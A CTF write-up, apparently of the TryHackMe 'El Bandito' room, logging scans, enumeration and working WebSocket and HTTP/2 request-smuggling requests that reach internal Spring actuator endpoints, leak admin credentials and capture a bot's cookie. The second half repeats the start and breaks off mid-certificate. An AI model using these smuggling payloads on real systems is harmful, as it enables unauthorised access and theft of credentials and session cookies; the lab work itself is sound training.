@@ -1,0 +1,1465 @@
+===============EL BANDITO ROOM TRYHACKME=============
+DATE: 11-02-2025
+LINK:https://tryhackme.com/room/elbandito
+DIFFICULTY: Hard
+
+
+
+##-------Box enumerqtion----------------
+❯ sudo rustscan -a 10.10.246.149 -- -A -sV -sC -O -Pn
+[sudo] password for thierry: 
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+The Modern Day Port Scanner.
+________________________________________
+: http://discord.skerritt.blog         :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+With RustScan, I scan ports so fast, even my firewall gets whiplash 💨
+
+[~] The config file is expected to be at "/root/.rustscan.toml"
+[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
+Open 10.10.246.149:22
+Open 10.10.246.149:80
+Open 10.10.246.149:631
+Open 10.10.246.149:8080
+
+
+PORT     STATE SERVICE  REASON         VERSION
+22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 cb:a9:4c:96:21:ca:d3:31:02:b3:40:c4:d2:3a:c3:6f (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKyb+qLA66qdat8eHZU+gr17Z4ZQyxjzU4vpgpO/DBJp/l1kGP0+xKf/xL/5vJgOw4RzJu9xgLCzPvo2HlcxAju96D8wbK7QeZEyReDgsQ2ZEonFcu3lumx037ppRJRy9j0JpLXAm3L6dmkmVVMdS7liKEwxbKpJsMtFygzD9KGGgcqsyl3ZQlnp9X6bbBH2EP3c+5oEhX6IQB4asEjCECQwfyxblkRNDqDjGwJO5uBWoAwvBIsNTkw+qbD+HK7SRs3G+qaUAmtFAIm4wxjHocTaOLeowa/vpMIw7iWtZDQpfF+mBOIg9Cd3rEnuL1/lcNFqWNY9cwEl5w/O6SCe5txs8U5+MI5/lMmuxwYpEgnl3enSLcw0tNPHo+4Zm9qbF7iFHI9bSRd+LWLOYV2JVMMLmjpLFHWY1/P57HM9JSZgWQxoUy+DgMYjMQvQqUbw4dEgOqmtI8TtJ/b+LM9JjSkBtb/d3OWbW7+IPr5ef1dRXp2Wyxq/0gRoocaTIrZOc=
+|   256 38:59:34:63:8a:a4:1d:f1:a4:3b:9d:4f:de:fc:b0:15 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDOu2xwMBU8IitX/jPW+BLZ6dXgJoi1BCKP8IQTiGjB4xVjyp1ca5i4I0SAn1HA+X6ZQQAxS4krcUh2VzvAA45w=
+|   256 16:22:76:b1:d4:04:b6:96:60:cd:3f:35:d2:f4:8b:5d (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINSCVWLo/rLLCKzdlm8t4YNcRmNLazTWJHSkIIWRtjzx
+80/tcp   open  ssl/http syn-ack ttl 62 El Bandito Server
+|_http-title: Site doesn't have a title (text/html; charset=utf-8).
+| ssl-cert: Subject: commonName=localhost
+| Subject Alternative Name: DNS:localhost
+| Issuer: commonName=localhost
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-04-10T06:51:56
+| Not valid after:  2031-04-08T06:51:56
+| MD5:   b27d:890a:f042:b213:5197:0a59:8e7d:7032
+| SHA-1: c7ef:94a2:c156:0d67:0228:3e0e:ec9d:208b:1ef7:2610
+| -----BEGIN CERTIFICATE-----
+| MIIC2TCCAcGgAwIBAgIURBblAejJw5ScYoNqRPbL4wjFDX0wDQYJKoZIhvcNAQEL
+| BQAwFDESMBAGA1UEAwwJbG9jYWxob3N0MB4XDTIxMDQxMDA2NTE1NloXDTMxMDQw
+| ODA2NTE1NlowFDESMBAGA1UEAwwJbG9jYWxob3N0MIIBIjANBgkqhkiG9w0BAQEF
+| AAOCAQ8AMIIBCgKCAQEA1IGvkDTK2XXvNxpEVtjI2IaOL92aEiF6Jf7e0F5RNLa7
+| duXZ6A/R5ZAGLbiAZez8YWrcQ4kTQe6NJ+MfteA0uhoXv+I4D8ZlKPxhgRU9FKFB
+| x0LJjZLqISdw7QJSqpCd1swAtX+v9TbRrXxmoAW1G/Ym9reeJk/0DE4SZlyehrFA
+| KKbmtnxYYaGp1ntM+uPMY4jAu0YrEW99sPfYlalgPTTQB7g79Ee0QEud3+dZXKCI
+| qgEOmOmJ9Xlxpg7ETyd+h3piBtCZAQdtAeHBOOcQknERCYGYZh9dG7rNzET2Ek+b
+| 7xlKd9DYHivRAjoJnZs17qlfJNt/vYC8NK/eJpjsMwIDAQABoyMwITAJBgNVHRME
+| AjAAMBQGA1UdEQQNMAuCCWxvY2FsaG9zdDANBgkqhkiG9w0BAQsFAAOCAQEAHeuL
+| DWTNT+UZfRnvujyxEXUbxOyOnbXsF8pjEFkQez7MBJcpPpOh3Wyqp8CdilDfPmLc
+| 5i3yw62yrOTo0p93dY+Cq7SW5G5MABY0caGFFmsVi9G/eFs8AQt+34uWj0V0dimO
+| BdvLjfXe/q+YLfpJQgfcm6Xk32X0rOPBaE9b1uIabJUMUyq4fpDkCjhor8xV0vvu
+| 8ga4weYUAY0XJxxdPIT/VL6Y3qJooY0AQHrDsYBhogbwbCpXVuqtPgyMR2QcqRDG
+| cpjjdmLH+E5ecB7qsqRmwH1iDssf67+5/AX1pWOQI67K6UBS7PaWQAMZ7gOgq+xu
+| ptK8Vhti1lPidVjeeQ==
+|_-----END CERTIFICATE-----
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_ssl-date: TLS randomness does not represent time
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 NOT FOUND
+|     Date: Tue, 11 Feb 2025 09:36:27 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 207
+|     Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
+|     X-Content-Type-Options: nosniff
+|     X-Frame-Options: SAMEORIGIN
+|     X-XSS-Protection: 1; mode=block
+|     Feature-Policy: microphone 'none'; geolocation 'none';
+|     Age: 0
+|     Server: El Bandito Server
+|     Connection: close
+|     <!doctype html>
+|     <html lang=en>
+|     <title>404 Not Found</title>
+|     <h1>Not Found</h1>
+|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Date: Tue, 11 Feb 2025 09:35:22 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 58
+|     Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
+|     X-Content-Type-Options: nosniff
+|     X-Frame-Options: SAMEORIGIN
+|     X-XSS-Protection: 1; mode=block
+|     Feature-Policy: microphone 'none'; geolocation 'none';
+|     Age: 0
+|     Server: El Bandito Server
+|     Accept-Ranges: bytes
+|     Connection: close
+|     nothing to see <script src='/static/messages.js'></script>
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Date: Tue, 11 Feb 2025 09:35:25 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 0
+|     Allow: POST, GET, OPTIONS, HEAD
+|     Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
+|     X-Content-Type-Options: nosniff
+|     X-Frame-Options: SAMEORIGIN
+|     X-XSS-Protection: 1; mode=block
+|     Feature-Policy: microphone 'none'; geolocation 'none';
+|     Age: 0
+|     Server: El Bandito Server
+|     Accept-Ranges: bytes
+|     Connection: close
+|   RTSPRequest: 
+|_    HTTP/1.1 400 Bad Request
+|_http-server-header: El Bandito Server
+631/tcp  open  ipp      syn-ack ttl 63 CUPS 2.4
+|_http-server-header: CUPS/2.4 IPP/2.1
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Forbidden - CUPS v2.4.7
+8080/tcp open  http     syn-ack ttl 62 nginx
+|_http-favicon: Spring Java Framework
+|_http-title: Site doesn't have a title (application/json;charset=UTF-8).
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service 
+
+
+
+-----------Enumeration on port 80
+For the moment i'm not able to access to the port 80
+https://10.10.246.149
+
+-----Port 8080 enumeration----------------
+❯ gobuster dir -u http://10.10.246.149:8080/ -w /usr/share/wordlists/seclists/737/Discovery/Web-Content/big.txt  -t 100 -x .php
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.246.149:8080/
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/wordlists/seclists/737/Discovery/Web-Content/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+
+/adminnorthface       (Status: 403) [Size: 146]
+/adminonline.php      (Status: 403) [Size: 146]
+/admins.php           (Status: 403) [Size: 146]
+/adminpro.php         (Status: 403) [Size: 146]
+/adminpp              (Status: 403) [Size: 146]
+/admins               (Status: 403) [Size: 146]
+/autoconfig.php       (Status: 403) [Size: 146]
+/autoconfig           (Status: 403) [Size: 146]
+/beans                (Status: 403) [Size: 146]
+/trace                (Status: 403) [Size: 146]
+/env                  (Status: 403) [Size: 146
+/favicon.ico          (Status: 200) [Size: 946]
+/health               (Status: 200) [Size: 150]
+/info                 (Status: 200) [Size: 2]
+/token.php            (Status: 200) [Size: 8]
+/token                (Status: 200) [Size: 8]
+
+Progress: 40956 / 40958 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+so  i will go to see how the website works and check to all accessible pages.
+
+in maping we see some api routes:
+{"/webjars/**":{"bean":"resourceHandlerMapping"},"/**":{"bean":"resourceHandlerMapping"},"/**/favicon.ico":{"bean":"faviconHandlerMapping"},"{[/admin-flag],methods=[GET]}":{"bean":"requestMappingHandlerMapping","method":"public org.springframework.http.ResponseEntity<java.lang.String> net.thm.websocket.config.AdminController.adminFlag()"},"{[/admin-creds],methods=[GET]}":{"bean":"requestMappingHandlerMapping","method":"public org.springframework.http.ResponseEntity<java.lang.String> net.thm.websocket.config.AdminController.adminCreds()"},"{[/token]}":{"bean":"requestMappingHandlerMapping","method":"public org.springframework.http.ResponseEntity<java.lang.String> net.thm.websocket.config.AdminController.getBootTimeWithRandom()"},"{[/isOnline]}":{"bean":"requestMappingHandlerMapping","method":"public org.springframework.http.ResponseEntity<java.lang.String> net.thm.websocket.config.AppHealthController.health(java.lang.String) throws java.io.IOException"},"{[/error],produces=[text/html]}":{"bean":"requestMappingHandlerMapping","method":"public org.springframework.web.servlet.ModelAndView org.springframework.boot.autoconfigure.web.BasicErrorController.errorHtml(javax.servlet.http.HttpServletRequest,javax.servlet.http.HttpServletResponse)"},"{[/error]}":{"bean":"requestMappingHandlerMapping","method":"public org.springframework.http.ResponseEntity<java.util.Map<java.lang.String, java.lang.Object>> org.springframework.boot.autoconfigure.web.BasicErrorController.error(javax.servlet.http.HttpServletRequest)"},"{[/heapdump || /heapdump.json],methods=[GET],produces=[application/octet-stream]}":{"bean":"endpointHandlerMapping","method":"public void org.springframework.boot.actuate.endpoint.mvc.HeapdumpMvcEndpoint.invoke(boolean,javax.servlet.http.HttpServletRequest,javax.servlet.http.HttpServletResponse) throws java.io.IOException,javax.servlet.ServletException"},"{[/autoconfig || /autoconfig.json],methods=[GET],produces=[application/json]}":{"bean":"endpointHandlerMapping","m
+ethod":"public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.EndpointMvcAdapter.invoke()"},"{[/trace || /trace.json],methods=[GET],produces=[application/json]}":{"bean":"endpointHandlerMapping","method":"public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.EndpointMvcAdapter.invoke()"},"{[/health || /health.json],produces=[application/json]}":{"bean":"endpointHandlerMapping","method":"public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.HealthMvcEndpoint.invoke(java.security.Principal)"},"{[/dump || /dump.json],methods=[GET],produces=[application/json]}":{"bean":"endpointHandlerMapping","method":"public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.EndpointMvcAdapter.invoke()"},"{[/configprops || /configprops.json],methods=[GET],produces=[application/json]}":{"bean":"endpointHandlerMapping","method":"public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.EndpointMvcAdapter.invoke()"},"{[/env/{name:.*}],methods=[GET],produces=[application/json]}":{"bean":"endpointHandlerMapping","method":"public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.EnvironmentMvcEndpoint.value(java.lang.String)"},"{[/env || /env.json],methods=[GET],produces=[application/json]}":{"bean":"endpointHandlerMapping","method":"public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.EndpointMvcAdapter.invoke()"},"{[/metrics/{name:.*}],methods=[GET],produces=[application/json]}":{"bean":"endpointHandlerMapping","method":"public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.MetricsMvcEndpoint.value(java.lang.String)"},"{[/metrics || /metrics.json],methods=[GET],produces=[application/json]}":{"bean":"endpointHandlerMapping","method":"public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.EndpointMvcAdapter.invoke()"},"{[/mappings || /mappings.json],methods=[GET],produces=[application/json]}":{"bean":"endpointHandlerMapping","method":"public java.lang.Object o
+rg.springframework.boot.actuate.endpoint.mvc.EndpointMvcAdapter.invoke()"},"{[/beans || /beans.json],methods=[GET],produces=[application/json]}":{"bean":"endpointHandlerMapping","method":"public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.EndpointMvcAdapter.invoke()"},"{[/info || /info.json],methods=[GET],produces=[application/json]}":{"bean":"endpointHandlerMapping","method":"public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.EndpointMvcAdapter.invoke()"}}
+
+In /health we found:
+{"status":"UP","diskSpace":{"status":"UP","total":51963551744,"free":30980042752,"threshold":10485760},"db":{"status":"UP","database":"H2","hello":1}}
+
+in token.php we found:
+6203.885
+
+In info we don't found something.
+
+At the final we do't found something.
+
+
+================Enumeration of port 631=================
+
+When i try to acess to it i recieve an error message: Forbidden
+You cannot access this page.
+
+we will try  directory enumeration and after see if this is vulnerable to browser dsync attack.
+
+The directory enumeration failed.
+
+Now i will verify browser desync attack.
+
+fetch('http://10.10.246.149/', {
+    method: 'POST',
+    body: 'GET /redirect HTTP/1.1\r\nFoo: x',
+    mode: 'cors',
+})
+
+Nothing i think it is not vulnrerable.
+
+-------------------------After few min 
+I asked myself if i've done good job on port 8à so i come back and try t access : https://10.10.246.149:80/
+
+Bingo i access to the page but message "Nothing here"
+
+Dp i decide to do the directory enumeration.
+Starting gobuster in directory enumeration mode
+===============================================================
+/access               (Status: 200) [Size: 4817]
+/login                (Status: 405) [Size: 153]
+/logout               (Status: 302) [Size: 189] [--> /]
+/messages             (Status: 302) [Size: 189] [--> /]
+/ping                 (Status: 200) [Size: 4]
+/save                 (Status: 405) [Size: 153]
+/static               (Status: 301) [Size: 169] [--> http://10.10.246.149/static/]
+Progress: 20478 / 20479 (100.00%)
+
+
+let us investigate directories.
+
+Only access page give us sth cool: A login page
+----------------------------------------------------------------------------------
+Recap to th box after deciding to use a domain name : bandito.thm
+
+---web sites
+https://bandito.thm:80
+http://bandito.thm:631
+http://bandito.thm:8080
+
+--------let restart buttom to up
+Access to http://bandito.thm:8080. List of directories intersting
+http://bandito.thm:8080/services.html  -->
+When we want to quit we found an url : 
+    --> http://bandito.websocket.thm
+    --> http://bandito.public.thm
+http://bandito.thm:8080/burn.html
+In this page we see a form with 2 entries
+--> token address
+--> Ammount
+http://bandito.thm:8080/token.html
+when i go there i see this value : 1252.041
+
+Now i will add the two domain i found to see what i will found.
+
+bandito.public.thm bandito.websocket.thm
+
+I found nothing but when i come on bandito.public.thm:8080 it redirect me on http://bandito.thm:8080/burn.html. So i intercept the traffic.
+
+GET /burn.html HTTP/1.1
+Host: bandito.public.thm:8080
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+Pragma: no-cache
+Cache-Control: no-cache
+
+I think this is vulnerable to websocket request smuggling.
+let me check it is what framework
+8080/tcp open  http     syn-ack ttl 62 nginx
+|_http-favicon: Spring Java Framework  <---
+I will go to search if i will found something
+https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/spring-actuators.html
+
+it have directories like /env /trace ..
+
+nothing found after
+when i was intercepting and fowarding services.html request i notice something
+
+GET /isOnline?url=http://bandito.websocket.thm HTTP/1.1
+Host: bandito.thm:8080
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://bandito.thm:8080/services.html
+Connection: keep-alive
+Priority: u=4
+
+send it to repeter to see
+modify the request but first and open port 1234 with python 
+>>python3 -m http.server 1234
+The request : i see it on the task 3 of the course https://tryhackme.com/room/wsrequestsmuggling
+
+GET /isOnline?url=http://10.11.127.125:1234 HTTP/1.1
+Host: 10.10.107.178:8080
+Sec-WebSocket-Version: 777
+Upgrade: WebSocket
+Connection: Upgrade
+Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==
+
+GET /env HTTP/1.1
+Host: 10.10.107.178:8080
+
+Response:
+HTTP/1.1 101 
+Server: nginx
+Date: Tue, 11 Feb 2025 19:21:16 GMT
+Connection: upgrade
+X-Application-Context: application:8081
+
+HTTP/1.1 200 
+X-Application-Context: application:8081
+Content-Type: application/json;charset=UTF-8
+Transfer-Encoding: chunked
+Date: Tue, 11 Feb 2025 19:21:16 GMT
+
+c75
+{"profiles":[],"server.ports":{"local.server.port":8081},"servletContextInitParams":{},"systemProperties":{"java.runtime.name":"Java(TM) SE Runtime ...
+
+It works we have our 2 answers
+
+Now check for trace directory
+we foud sth cool
+{"method":"GET","path":"/admin-creds","headers":{"request":{"host":"0.0.0.0:8081","user-agent":"Wget","connection":"close"},"response":{"X-Application-Context":"application:8081","Content-Type":"text/plain","Content-Length":"55","Date":"Tue, 11 Feb 2025 19:31:20 GMT","Connection":"close","status":"200"}}}}
+
+{"method":"GET","path":"/admin-flag"
+
+let me check for admin-creds
+
+sername:hAckLIEN password:YouCanCatchUsInYourDreams404
+
+Now admin-flag
+THM{:::MY_DECLINATION:+62°_14\'_31.4'':::}
+------------------------------------------------------------------------------------
+
+Go to found the second flag
+I take credentials found on the last tab and logged in on the website of port 80 and it works
+when we check in view-source:https://10.10.107.178:80/static/messages.js we see:
+    
+function fetchMessages() {
+    fetch("/getMessages")
+        .then((response) => {
+            if (!response.ok) {
+            throw new Error("Failed to fetch messages");
+}
+
+i think i i arrive get this file i will get all message and the flag also
+let us see the request when i wrote a message
+
+POST /send_message HTTP/2
+Host: 10.10.29.204:80
+Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z6xXIw.RjAOKqBAVq-hXmbx9urAFZ3t3Qg
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://10.10.29.204:80/messages
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 13
+Origin: https://10.10.29.204:80
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=0
+Te: trailers
+
+data=yyyyazza
+
+Let us modify it as on the task 5 of room http2 request smuggling
+bar
+Host: 10.10.107.178:80
+
+GET /getMessages HTTP/1.1
+Content-Length: 300
+Host: 10.10.107.178:80
+Content-Type: application/x-www-urlencoded
+
+q=
+
+I try but nothing let us continue searching ways
+
+Request: 
+POST /send_message HTTP/2
+Host: 10.10.29.204:80
+Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z6xXIw.RjAOKqBAVq-hXmbx9urAFZ3t3Qg
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://10.10.29.204:80/messages
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+Origin: https://10.10.29.204:80
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=0
+Te: trailers
+
+GET /getMessages HTTP/1.1
+X: f
+
+Answer:
+
+HTTP/2 200 OK
+Date: Wed, 12 Feb 2025 08:32:40 GMT
+Content-Type: application/json
+Content-Length: 351
+Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+X-Xss-Protection: 1; mode=block
+Feature-Policy: microphone 'none'; geolocation 'none';
+Age: 0
+Server: El Bandito Server
+Accept-Ranges: bytes
+
+{"JACK":["The Galactic Enforcement's quantum sniffers are onto us, tracing our blockchain exploits.","They're using predictive analytics, thinking they're ahead in a 4D chess game across the blockchain.","You need to jump now! Awaiting your signal to close the portal.","fff","hhh","yyyyaa","yyyyazza",null,null,null,null,null,null,null],"OLIVER":[]}
+
+
+i get it but not flag
+
+
+Wheni put this request i see something but not the flag
+
+POST / HTTP/2
+Host: 10.10.29.204:80
+Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z6xXIw.RjAOKqBAVq-hXmbx9urAFZ3t3Qg
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+
+POST /send_message HTTP/1.1
+Host: 10.10.29.204:80
+Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z6xXIw.RjAOKqBAVq-hXmbx9urAFZ3t3Qg
+Content-Length: 300
+Content-Type: application/x-www-form-urlencoded
+
+data=a
+
+
+
+Answer
+
+a\r\n\r\nPOST /send_message HTTP/1.1\r\nHost: 10.10.29.204:80\r\nCookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z6xXIw.RjAOKqBAVq-hXmbx9urAFZ3t3Qg\r\nContent-Length: 900\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\ndata=aPOST / HTTP/1.1\r\nscheme: https\r\nhost: 10.10.29.204:80\r\ncookie: session=eyJ1c"
+
+that is good sth different
+
+After oe hour searching the good request u=i finished found
+
+POST / HTTP/2
+Host: 10.10.29.204:80
+Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z6xXIw.RjAOKqBAVq-hXmbx9urAFZ3t3Qg
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+
+POST /send_message HTTP/1.1
+Host: 10.10.29.204:80
+Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z6xXIw.RjAOKqBAVq-hXmbx9urAFZ3t3Qg
+Content-Length: 700
+Content-Type: application/x-www-form-urlencoded
+
+data=b
+
+
+Answer:
+'bGET /access HTTP/1.1\r\nhost: bandito.public.thm:80\r\nscheme: https\r\nsec-ch-ua: "Chromium";v="122", "Not(A:Brand";v="24", "HeadlessChrome";v="122"\r\nsec-ch-ua-mobile: ?0\r\nsec-ch-ua-platform: "Linux"\r\nupgrade-insecure-requests: 1\r\nuser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.128 Safari/537.36\r\naccept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nsec-fetch-site: none\r\nsec-fetch-mode: navigate\r\nsec-fetch-user: ?1\r\nsec-fetch-dest: document\r\naccept-encoding: gzip, deflate, br\r\ncookie: flag=THM{¡!¡RIGHT_ASCENSION_12h_36m_25.46s!¡!}\r\nX-Forw'<---------------
+
+Wawww it was a good job
+
+Cnclusion: 
+
+
+===============EL BANDITO ROOM TRYHACKME=============
+DATE: 11-02-2025
+LINK:https://tryhackme.com/room/elbandito
+DIFFICULTY: Hard
+
+
+
+##-------Box enumerqtion----------------
+❯ sudo rustscan -a 10.10.246.149 -- -A -sV -sC -O -Pn
+[sudo] password for thierry: 
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+The Modern Day Port Scanner.
+________________________________________
+: http://discord.skerritt.blog         :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+With RustScan, I scan ports so fast, even my firewall gets whiplash 💨
+
+[~] The config file is expected to be at "/root/.rustscan.toml"
+[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
+Open 10.10.246.149:22
+Open 10.10.246.149:80
+Open 10.10.246.149:631
+Open 10.10.246.149:8080
+
+
+PORT     STATE SERVICE  REASON         VERSION
+22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 cb:a9:4c:96:21:ca:d3:31:02:b3:40:c4:d2:3a:c3:6f (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKyb+qLA66qdat8eHZU+gr17Z4ZQyxjzU4vpgpO/DBJp/l1kGP0+xKf/xL/5vJgOw4RzJu9xgLCzPvo2HlcxAju96D8wbK7QeZEyReDgsQ2ZEonFcu3lumx037ppRJRy9j0JpLXAm3L6dmkmVVMdS7liKEwxbKpJsMtFygzD9KGGgcqsyl3ZQlnp9X6bbBH2EP3c+5oEhX6IQB4asEjCECQwfyxblkRNDqDjGwJO5uBWoAwvBIsNTkw+qbD+HK7SRs3G+qaUAmtFAIm4wxjHocTaOLeowa/vpMIw7iWtZDQpfF+mBOIg9Cd3rEnuL1/lcNFqWNY9cwEl5w/O6SCe5txs8U5+MI5/lMmuxwYpEgnl3enSLcw0tNPHo+4Zm9qbF7iFHI9bSRd+LWLOYV2JVMMLmjpLFHWY1/P57HM9JSZgWQxoUy+DgMYjMQvQqUbw4dEgOqmtI8TtJ/b+LM9JjSkBtb/d3OWbW7+IPr5ef1dRXp2Wyxq/0gRoocaTIrZOc=
+|   256 38:59:34:63:8a:a4:1d:f1:a4:3b:9d:4f:de:fc:b0:15 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDOu2xwMBU8IitX/jPW+BLZ6dXgJoi1BCKP8IQTiGjB4xVjyp1ca5i4I0SAn1HA+X6ZQQAxS4krcUh2VzvAA45w=
+|   256 16:22:76:b1:d4:04:b6:96:60:cd:3f:35:d2:f4:8b:5d (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINSCVWLo/rLLCKzdlm8t4YNcRmNLazTWJHSkIIWRtjzx
+80/tcp   open  ssl/http syn-ack ttl 62 El Bandito Server
+|_http-title: Site doesn't have a title (text/html; charset=utf-8).
+| ssl-cert: Subject: commonName=localhost
+| Subject Alternative Name: DNS:localhost
+| Issuer: commonName=localhost
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-04-10T06:51:56
+| Not valid after:  2031-04-08T06:51:56
+| MD5:   b27d:890a:f042:b213:5197:0a59:8e7d:7032
+| SHA-1: c7ef:94a2:c156:0d67:0228:3e0e:ec9d:208b:1ef7:2610
+| -----BEGIN CERTIFICATE-----
+| MIIC2TCCAcGgAwIBAgIURBblAejJw5ScYoNqRPbL4wjFDX0wDQYJKoZIhvcNAQEL
+| BQAwFDESMBAGA1UEAwwJbG9jYWxob3N0MB4XDTIxMDQxMDA2NTE1NloXDTMxMDQw
+| ODA2NTE1NlowFDESMBAGA1UEAwwJbG9jYWxob3N0MIIBIjANBgkqhkiG9w0BAQEF
+| AAOCAQ8AMIIBCgKCAQEA1IGvkDTK2XXvNxpEVtjI2IaOL92aEiF6Jf7e0F5RNLa7
+| duXZ6A/R5ZAGLbiAZez8YWrcQ4kTQe6NJ+MfteA0uhoXv+I4D8ZlKPxhgRU9FKFB
+| x0LJjZLqISdw7QJSqpCd1swAtX+v9TbRrXxmoAW1G/Ym9reeJk/0DE4SZlyehrFA
+| KKbmtnxYYaGp1ntM+uPMY4jAu0YrEW99sPfYlalgPTTQB7g79Ee0QEud3+dZXKCI
